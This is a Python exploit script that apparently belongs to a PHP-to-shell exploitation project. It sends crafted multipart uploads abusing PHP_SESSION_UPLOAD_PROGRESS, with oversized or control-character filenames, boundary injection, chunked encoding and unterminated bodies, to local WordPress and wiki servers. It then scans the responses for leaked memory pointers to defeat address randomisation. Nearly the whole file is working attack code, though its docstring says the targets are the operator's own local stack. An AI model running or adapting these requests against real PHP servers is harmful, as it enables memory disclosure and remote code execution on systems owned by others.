#!/usr/bin/env python3
"""Freeze battery: find an arm variant whose machinery record SURVIVES
request end on our PIE realapps stack (observable: non-zero sess file),
then probe the same sid and scan the response for canonical pointers.
All requests are plain HTTP multipart to the operator's own local stack."""

import hashlib
import importlib.util
import json
import os
import socket
import struct
import sys
import time
from pathlib import Path

LEAK_PATH = Path("/tmp/opencode/realapps/side/php2shell/native-output-leak.py")
spec = importlib.util.spec_from_file_location("leak", LEAK_PATH)
LEAK = importlib.util.module_from_spec(spec)
spec.loader.exec_module(LEAK)

TARGETS = {
    "wiki": ("127.0.0.1", 28840, "/index.php", "/tmp/opencode/realapps/sessions/wiki"),
    "wp": ("127.0.0.1", 28841, "/index.php", "/tmp/opencode/realapps/sessions/wp"),
}
OUT = Path("/tmp/opencode/realapps/side/universal/battery")


def rand4() -> bytes:
    return hashlib.sha1(str(os.urandom(8)).encode()).hexdigest()[:4].encode()


def part(index: int, filename: bytes) -> bytes:
    return (
        b"--" + LEAK.BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="file' + str(index).encode()
        + b'"; filename="' + filename + b'"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nX\r\n"
    )


def field(bname: bytes, bvalue: bytes) -> bytes:
    return (
        b"--" + LEAK.BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + bname + b'"\r\n\r\n'
        + bvalue + b"\r\n"
    )


def multipart(body_parts, closing=True, closing_smart=False):
    blob = b"".join(body_parts)
    if closing:
        blob += b"--" + LEAK.BOUNDARY + b"--\r\n"
    elif closing_smart:
        blob += b"--" + LEAK.BOUNDARY
    return blob


def request(head, host_header, body=None, cookie=None, keepalive=True):
    hb = (
        b"POST " + head.encode() + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode() + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keepalive else b"Connection: close\r\n")
        + (b"Cookie: PHPSESSID=" + cookie + b"\r\n" if cookie else b"")
        + b"Content-Type: multipart/form-data; boundary="
        + LEAK.BOUNDARY + b"\r\n"
    )
    if body is None:
        return hb + b"Transfer-Encoding: chunked\r\n\r\n"
    return hb + b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body


def read_response(stream):
    return LEAK.read_response(stream)


def scan_pointers(blob: bytes, limit: int = 16):
    hits = []
    for i in range(len(blob) - 7):
        v = struct.unpack_from("<Q", blob, i)[0]
        if (0x600000000000 <= v < 0x900000000000) and blob[i + 6] == 0 and blob[i + 7] == 0:
            hits.append((i, f"0x{v:x}"))
            if len(hits) >= limit:
                break
    return hits


def sess_path(tkey: str, sid: bytes) -> Path:
    return Path(TARGETS[tkey][3]) / ("sess_" + sid.decode())


def run_variant(tkey: str, variant: str, sid: bytes):
    host, port, path, _ = TARGETS[tkey]
    hh = f"{host}:{port}"
    res = {"target": tkey, "variant": variant, "sid": sid.decode()}

    # --- build arm body -------------------------------------------------
    if variant in ("ov_cl_500k", "ov_ch_500k"):
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid)]
                         + [part(i, b"F" * 524288) for i in range(20)])
        if variant.startswith("ov_ch"):
            raw = request(path, hh, None, sid, False)
            chunk = b""
            blobs = body
            while blobs:
                seg, blobs = blobs[:16384], blobs[16384:]
                chunk += format(len(seg), "x").encode() + b"\r\n" + seg + b"\r\n"
            raw += chunk + b"0\r\n\r\n"
        else:
            raw = request(path, hh, body, sid, False)
    elif variant in ("ov_cl_700k", "ov_ch_700k"):
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid)]
                         + [part(i, b"F" * 716800) for i in range(20)])
        if variant.startswith("ov_ch"):
            raw = request(path, hh, None, sid, False)
            chunk = b""
            blobs = body
            while blobs:
                seg, blobs = blobs[:16384], blobs[16384:]
                chunk += format(len(seg), "x").encode() + b"\r\n" + seg + b"\r\n"
            raw += chunk + b"0\r\n\r\n"
        else:
            raw = request(path, hh, body, sid, False)
    elif variant in ("ov_cl_1m", "ov_ch_1m"):
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid)]
                         + [part(i, b"F" * 1048576) for i in range(20)])
        if variant.startswith("ov_ch"):
            raw = request(path, hh, None, sid, False)
            chunk = b""
            blobs = body
            while blobs:
                seg, blobs = blobs[:16384], blobs[16384:]
                chunk += format(len(seg), "x").encode() + b"\r\n" + seg + b"\r\n"
            raw += chunk + b"0\r\n\r\n"
        else:
            raw = request(path, hh, body, sid, False)
    if variant == "ch_te":                       # chunked TE, same sizes as CLI arm
        body = LEAK.arm_body(sid, 20, 65536)
        raw = request(path, hh, None, sid, False)
        chunks = b""
        blob = body
        while blob:
            chunk, blob = blob[:16384], blob[16384:]
            chunks += format(len(chunk), "x").encode() + b"\r\n" + chunk + b"\r\n"
        chunked = chunks + b"0\r\n\r\n"
        raw += chunked
    elif variant == "single_1m":                 # one 1MB filename part
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid),
                          part(0, b"F" * 1048576)])
        raw = request(path, hh, body, sid, False)
    elif variant == "ctl_chars":                 # control chars inside filename
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid),
                          part(0, b"F\x01\x02\x03\x04\x0e\x1f\x7f" * 64)])
        raw = request(path, hh, body, sid, False)
    elif variant == "bound_in_name":             # boundary marker inside filename
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid),
                          part(0, b"--" + LEAK.BOUNDARY + b"--" + b"F" * 256)])
        raw = request(path, hh, body, sid, False)
    elif variant == "no_closing":                # unterminated multipart
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid),
                          part(0, b"F" * 128)], closing=False)
        raw = request(path, hh, body, sid, False)
    elif variant == "cls_boundary":              # closing boundary, no CR LF
        body = multipart([field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
                          field(b"PHPSESSID", sid),
                          part(0, b"F" * 128)], closing=True, closing_smart=True)
        raw = request(path, hh, body, sid, False)
    elif variant == "same_conn":                 # CLI arm, then probe SAME socket
        body = LEAK.arm_body(sid, 20, 262144)
        raw = request(path, hh, body, sid, True)
    else:                                        # baseline sanity
        body = LEAK.arm_body(sid, 20, 262144)
        raw = request(path, hh, body, sid, False)

    conn = socket.create_connection((host, port), timeout=60)
    conn.settimeout(60)
    stream = conn.makefile("rb", buffering=0)
    conn.sendall(raw)
    try:
        resp, body_dec, headers, status = read_response(stream)
    except Exception as err:
        resp, body_dec, headers, status = b"", b"", {}, -1
        res["arm_exception"] = f"{type(err).__name__}: {err}"
    same_socket = variant == "same_conn"
    if not same_socket:
        conn.close()
    res["arm_status"] = status
    res["arm_resp_bytes"] = len(resp)
    (OUT / f"{tkey}_{variant}_arm_resp.bin").write_bytes(resp)

    # --- probe: same sid, same socket for same_conn, else fresh conn ----
    time.sleep(1.0)
    pbody = LEAK.probe_body()
    preq = request(path, hh, pbody, sid, True)
    if same_socket:
        pconn = conn
        pstream = stream
    else:
        pconn = socket.create_connection((host, port), timeout=60)
        pconn.settimeout(60)
        pstream = pconn.makefile("rb", buffering=0)
    pconn.sendall(preq)
    try:
        pres, pbody, pheaders, pstatus = read_response(pstream)
    except Exception as err:
        pres, pbody, pheaders, pstatus = b"", b"", {}, -1
        res["probe_exception"] = f"{type(err).__name__}: {err}"
    pconn.close()
    res["probe_status"] = pstatus
    res["probe_body_bytes"] = len(pbody)
    res["probe_hits"] = scan_pointers(pbody)
    (OUT / f"{tkey}_{variant}_probe_resp.bin").write_bytes(pres)

    # --- machinery record observable -----------------------------------
    sp = sess_path(tkey, sid)
    res["sess_bytes"] = sp.stat().st_size if sp.exists() else -1
    return res


def main() -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    variants = ["ov_cl_500k", "ov_ch_500k", "ctl_chars",
                "no_closing", "cls_boundary", "ch_te"]
    results = []
    for tkey in TARGETS:
        for variant in variants:
            sid = b"bz" + variant[:4].encode().replace(b"_", b"x") + rand4()
            ff = sid  # length 8, alnum, no underscore
            try:
                item = run_variant(tkey, variant, ff)
            except Exception as err:
                item = {"target": tkey, "variant": variant,
                        "error": f"{type(err).__name__}: {err}"}
            results.append(item)
            print(json.dumps(item))
    (OUT / "battery_result.json").write_text(
        json.dumps(results, indent=2, sort_keys=True) + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
